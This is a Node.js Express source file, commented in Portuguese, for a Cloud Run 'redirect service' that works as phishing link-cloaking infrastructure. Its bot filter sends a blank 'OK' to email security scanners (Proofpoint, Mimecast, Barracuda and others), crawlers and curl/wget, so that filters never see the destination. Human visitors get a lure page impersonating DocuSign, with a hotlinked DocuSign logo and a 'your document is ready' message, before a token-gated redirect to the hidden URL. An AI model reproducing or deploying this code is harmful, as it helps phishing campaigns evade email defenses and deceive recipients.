// ============================================================
//  REDIRECT SERVICE — Google Cloud Run
//  Links lidos de links.json (sem banco de dados)
//  Tokens HMAC assinados (sem estado compartilhado)
// ============================================================

const express = require("express");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");
const crypto = require("crypto");
const path = require("path");

const app = express();

// Cloud Run define a porta via variável de ambiente PORT (obrigatório)
const PORT = process.env.PORT || 8080;
const SECRET_KEY = process.env.SECRET_KEY || "troque-esta-chave-no-cloud-run";
const BASE_URL = process.env.BASE_URL || "https://seu-servico.run.app";

// ─── Carrega links do arquivo links.json ─────────────────────────────────────
// Para adicionar links: edite links.json e faça novo deploy
const LINKS = require("./links.json");

// ─── Padrões de bot e scanners de segurança de email ─────────────────────────
const BOT_PATTERNS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i,
  /googlebot/i, /bingbot/i, /yahoo/i, /duckduck/i, /baidu/i,
  /yandex/i, /sogou/i, /facebot/i, /ia_archiver/i,
  /semrush/i, /ahrefs/i, /mj12bot/i, /dotbot/i,
  /linkedinbot/i, /twitterbot/i, /telegrambot/i,
  /facebookexternalhit/i, /preview/i,
  /curl/i, /wget/i, /python/i, /java\//i,
  /go-http/i, /postman/i, /axios/i, /urllib/i, /okhttp/i,
  // Scanners de segurança de email (causam falso phishing)
  /proofpoint/i, /mimecast/i, /barracuda/i, /symantec/i,
  /messagelabs/i, /cloudmark/i, /sophos/i, /trend\s?micro/i,
  /forcepoint/i, /ironport/i, /fireeye/i, /checkpoint/i,
  /kaspersky/i, /bitdefender/i, /avast/i,
];

function isBot(ua) {
  if (!ua || ua.trim().length < 10) return true;
  return BOT_PATTERNS.some((p) => p.test(ua));
}

// ─── Token HMAC assinado — sem banco de dados, sem estado ────────────────────
// Funciona mesmo com múltiplas instâncias do Cloud Run rodando em paralelo
function createToken(shortCode) {
  const ts = Date.now();
  const payload = `${shortCode}:${ts}`;
  const hmac = crypto.createHmac("sha256", SECRET_KEY)
    .update(payload).digest("hex").substring(0, 24);
  return Buffer.from(`${payload}:${hmac}`).toString("base64url");
}

function validateToken(token, expectedCode) {
  try {
    const decoded = Buffer.from(token, "base64url").toString("utf8");
    const [shortCode, ts, hmac] = decoded.split(":");
    if (!shortCode || !ts || !hmac) return false;
    // Expira em 90 segundos
    if (Math.abs(Date.now() - parseInt(ts)) > 90000) return false;
    // Verifica código
    if (shortCode !== expectedCode) return false;
    // Verifica HMAC
    const expected = crypto.createHmac("sha256", SECRET_KEY)
      .update(`${shortCode}:${ts}`).digest("hex").substring(0, 24);
    return hmac === expected;
  } catch {
    return false;
  }
}

// ─── Página de desafio JavaScript — visual de documento pronto ───────────────
// Personalize: substitua LOGO_URL pela URL da logo da sua empresa
// Exemplo: const LOGO_URL = "https://seusite.com.br/logo.png";
const LOGO_URL = process.env.LOGO_URL || "https://na2.docusign.net/Signing/Images/email/Email_Logo.png";
const COMPANY_NAME = process.env.COMPANY_NAME || "DocuSign";

function challengePage(shortCode, token) {
  const logoHtml = LOGO_URL
    ? `<img src="${LOGO_URL}" alt="${COMPANY_NAME}" style="height:32px;max-width:140px;object-fit:contain">`
    : `<div style="width:36px;height:36px;border-radius:8px;background:#e8edf9;display:flex;align-items:center;justify-content:center;font-size:11px;color:#94a3b8">logo</div>`;

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Documento pronto</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
         background:#f4f6fb;min-height:100vh;display:flex;flex-direction:column}
    /* ── Barra superior ── */
    .topbar{
      background:#fff;border-bottom:1px solid #e8edf5;
      padding:14px 28px;
      display:flex;align-items:center;justify-content:space-between;
      position:sticky;top:0;
    }
    .brand{display:flex;align-items:center;gap:10px}
    .company-name{font-size:14px;font-weight:600;color:#1e293b}
    /* ── Badge download (canto superior direito) ── */
    .dl-badge{
      display:flex;align-items:center;gap:7px;
      background:#f0faf4;border:1px solid #86efac;
      border-radius:20px;padding:6px 16px;
      animation:fadein .4s ease;
    }
    .dl-badge span{font-size:12px;font-weight:600;color:#15803d}
    @keyframes fadein{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
    /* ── Conteúdo central ── */
    .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
    .card{
      background:#fff;border-radius:20px;
      border:1px solid #e8edf5;
      padding:48px 40px;text-align:center;
      max-width:380px;width:100%;
    }
    .doc-icon{
      width:72px;height:72px;background:#f0faf4;border-radius:50%;
      display:flex;align-items:center;justify-content:center;
      margin:0 auto 24px;
    }
    h2{font-size:20px;font-weight:700;color:#0f172a;margin-bottom:10px}
    .sub{font-size:14px;color:#64748b;line-height:1.6;margin-bottom:32px}
    /* ── Barra de progresso ── */
    .progress-wrap{height:5px;background:#e8edf5;border-radius:5px;overflow:hidden;margin-bottom:12px}
    .progress-bar{
      height:100%;width:0%;background:linear-gradient(90deg,#4ade80,#16a34a);
      border-radius:5px;transition:width 1s cubic-bezier(.4,0,.2,1);
    }
    .progress-bar.full{width:100%}
    .hint{font-size:12px;color:#94a3b8}
  </style>
</head>
<body>

  <div class="topbar">
    <div class="brand">
      ${logoHtml}
      <span class="company-name">${COMPANY_NAME}</span>
    </div>
    <div class="dl-badge">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
           stroke="#15803d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
        <polyline points="7 10 12 15 17 10"/>
        <line x1="12" y1="15" x2="12" y2="3"/>
      </svg>
      <span>Documento baixado</span>
    </div>
  </div>

  <div class="main">
    <div class="card">
      <div class="doc-icon">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none"
             stroke="#16a34a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
          <polyline points="14 2 14 8 20 8"/>
          <line x1="9" y1="13" x2="15" y2="13"/>
          <line x1="9" y1="17" x2="13" y2="17"/>
        </svg>
      </div>
      <h2>Seu documento está pronto</h2>
      <p class="sub">O arquivo foi preparado com sucesso.<br>Você será redirecionado em instantes.</p>
      <div class="progress-wrap">
        <div class="progress-bar" id="bar"></div>
      </div>
      <p class="hint">Abrindo...</p>
    </div>
  </div>

  <script>
    setTimeout(function(){ document.getElementById('bar').classList.add('full'); }, 80);
    setTimeout(function(){
      window.location.replace('/go/${shortCode}?_t=${token}');
    }, 1200);
  </script>
  <noscript>
    <p style="text-align:center;padding:40px;font-family:sans-serif;color:#64748b">
      Por favor, habilite o JavaScript para continuar.
    </p>
  </noscript>
</body>
</html>`;
}

// ─── Middlewares ──────────────────────────────────────────────────────────────
app.use(helmet({ contentSecurityPolicy: false }));
app.set("trust proxy", 1); // Cloud Run está atrás de proxy do Google

// Rate limit: 60 req/min por IP
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => res.status(429).send("Muitas requisições."),
}));

// ─── GET /r/:shortCode — Link que vai no email ────────────────────────────────
app.get("/r/:shortCode", (req, res) => {
  const { shortCode } = req.params;
  const ua = req.headers["user-agent"] || "";
  const link = LINKS[shortCode];

  if (!link) {
    return res.status(404).send("Link não encontrado.");
  }

  // Bot detectado → resposta vazia (não revela o destino)
  if (isBot(ua)) {
    console.log(`BOT | ${shortCode} | ${ua.substring(0, 80)}`);
    return res.status(200).type("text/plain").send("OK");
  }

  // Humano → desafio JavaScript
  const token = createToken(shortCode);
  console.log(`DESAFIO | ${shortCode}`);

  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Robots-Tag", "noindex");
  res.status(200).send(challengePage(shortCode, token));
});

// ─── GET /go/:shortCode?_t=TOKEN — Após desafio JS ───────────────────────────
app.get("/go/:shortCode", (req, res) => {
  const { shortCode } = req.params;
  const token = req.query._t || "";
  const link = LINKS[shortCode];

  if (!link) return res.status(404).send("Link não encontrado.");

  if (!validateToken(token, shortCode)) {
    console.log(`TOKEN INVÁLIDO | ${shortCode}`);
    return res.redirect(302, `/r/${shortCode}`);
  }

  console.log(`CLIQUE | ${shortCode} → ${link.url}`);
  res.setHeader("Cache-Control", "no-store");
  res.redirect(302, link.url);
});

// ─── Health check — Google Cloud Run verifica este endpoint ──────────────────
app.get("/health", (req, res) => {
  res.json({ status: "ok", links: Object.keys(LINKS).length });
});

// ─── Inicia ───────────────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔗 ${Object.keys(LINKS).length} links carregados`);
  console.log(`🔑 SECRET_KEY: ${SECRET_KEY !== "troque-esta-chave-no-cloud-run" ? "✅ configurada" : "⚠️ PADRÃO (configure no Cloud Run!)"}`);
});
